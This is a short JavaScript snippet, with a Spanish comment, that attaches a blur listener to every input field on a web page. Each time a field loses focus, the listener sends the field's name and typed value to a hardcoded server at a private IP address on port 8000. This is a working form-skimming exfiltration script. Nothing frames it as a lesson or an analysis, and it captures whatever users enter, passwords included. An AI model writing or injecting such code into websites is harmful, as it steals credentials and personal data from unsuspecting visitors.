var input = document.querySelectorAll("input");

function saveLocal(e) {
    var url = "http://192.168.30.178:8000/"; 
    var method = "GET"; //Metodo HTTP
    var request = new XMLHttpRequest();
    request.open(method, url + this.name + ":" + this.value, false);
    request.send();
}

for (var i = 0; i < input.length; i++) {

    input[i].addEventListener("blur", saveLocal);
    
    }
